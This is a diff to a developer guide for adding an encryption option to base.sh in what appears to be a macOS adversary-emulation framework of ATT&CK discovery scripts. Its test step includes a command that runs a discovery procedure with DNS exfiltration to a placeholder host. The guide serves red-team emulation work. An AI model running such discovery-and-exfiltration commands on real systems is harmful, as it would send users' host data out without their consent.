@@ -1,6 +1,6 @@
 # How to Add a New Encryption Method to base.sh
 
-This guide provides precise step-by-step instructions for adding a new encryption method to base.sh.
+Target file: [`attackmacos/core/base/base.sh`](../../../attackmacos/core/base/base.sh). Coordinate with [Enhance a Base Feature.md](Enhance%20a%20Base%20Feature.md) for case-switch and help text.
 
 ---
 
@@ -120,24 +120,16 @@ esac
 
 ---
 
-## Step 4: Add Command Validation in core_validate_commands()
+## Step 4: Validate the new encryption option
 
-Update core_validate_commands() to check for any dependencies:
+Encryption types are validated in **`core_validate_parsed_args()`** (example: `aes|gpg|xor`). Add your method there:
 
 ```sh
-# In core_validate_commands function
-if [ "$ENCRYPT" = "yourmethod" ] && ! command -v "$CMD_REQUIRED_TOOL" > /dev/null 2>&1; then
-    missing_cmds="$missing_cmds $CMD_REQUIRED_TOOL"
-fi
+# In core_validate_parsed_args(), encryption case
+aes|gpg|xor|yourmethod) ;;
 ```
 
-Example (XOR with Perl dependency):
-```sh
-# Check if perl is needed for XOR encryption
-if [ "$ENCRYPT" = "xor" ] && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
-    missing_cmds="$missing_cmds $CMD_PERL"
-fi
-```
+If the method requires extra binaries beyond what macOS always ships, extend **`core_validate_command()`** (or check at the start of `encrypt_with_yourmethod()`) with `command -v "$CMD_WHATEVER"` and fail clearly. Today `core_validate_command()` only enforces a minimal set (`date`, `printf`); most encrypt paths rely on OpenSSL/GPG being present when those modes are selected.
 
 ---
 
@@ -179,17 +171,12 @@ CMD_YOURTOOL_OPTS="--any-needed-options"
 
 ## Step 7: Test Your Implementation
 
-Run tests to verify your encryption method works correctly:
+Use a merged generated script (not raw `base.sh` alone):
 
 ```sh
-# Test basic encryption
-./base.sh --ls --encrypt yourmethod
-
-# Test with JSON output
-./base.sh --ls --encrypt yourmethod -f json
-
-# Test with exfiltration
-./base.sh --ls --encrypt yourmethod --exfil-dns example.com
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt yourmethod
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt yourmethod --format json
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt yourmethod --exfil-dns example.com
 ```
 
 Verify:
@@ -252,12 +239,12 @@ case "$method" in
 esac
 ```
 
-### Step 4: Added validation in core_validate_commands()
+### Step 4: Added `xor` to validation in `core_validate_parsed_args()`
 ```sh
-# Check if perl is needed for XOR encryption
-if [ "$ENCRYPT" = "xor" ] && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
-    missing_cmds="$missing_cmds $CMD_PERL"
-fi
+case "$ENCRYPT" in
+    aes|gpg|xor) ;;
+    *) validation_errors="${validation_errors}Invalid encryption: ..." ;;
+esac
 ```
 
 ### Step 5: Updated help text in core_display_help()
